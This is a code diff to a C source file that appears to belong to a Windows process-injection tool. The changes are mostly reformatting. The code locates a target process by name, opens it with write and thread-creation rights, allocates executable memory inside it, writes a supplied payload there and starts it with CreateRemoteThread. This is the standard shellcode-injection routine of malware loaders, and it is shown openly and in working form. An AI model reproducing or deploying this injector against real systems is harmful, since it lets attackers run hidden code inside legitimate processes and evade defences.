@@ -4,7 +4,6 @@
 #include "common.h"
 
 int findTarget(const char* procname) {
-
     HANDLE hProcSnap;
     PROCESSENTRY32 pe32;
     int pid = 0;
@@ -20,7 +19,7 @@ int findTarget(const char* procname) {
     }
 
     while (Process32Next(hProcSnap, &pe32)) {
-        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+        if (lstrcmpiA(procname, (LPCSTR)pe32.szExeFile) == 0) {
             pid = pe32.th32ProcessID;
             break;
         }
@@ -31,17 +30,17 @@ int findTarget(const char* procname) {
     return pid;
 }
 
-
 int inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
-
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
+    pRemoteCode =
+        VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len,
+                       (SIZE_T*)NULL);
 
-    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
-
-    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+    hThread = CreateRemoteThread(
+        hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
     if (hThread != NULL) {
         WaitForSingleObject(hThread, 500);
         CloseHandle(hThread);
@@ -60,8 +59,9 @@ int processInject(unsigned char* payload, unsigned int payload_len) {
     if (pid) {
         // try to open target process
         hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
-            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
-            FALSE, (DWORD)pid);
+                                PROCESS_VM_OPERATION | PROCESS_VM_READ |
+                                PROCESS_VM_WRITE,
+                            FALSE, (DWORD)pid);
 
         if (hProc != NULL) {
             // inject payload into target process
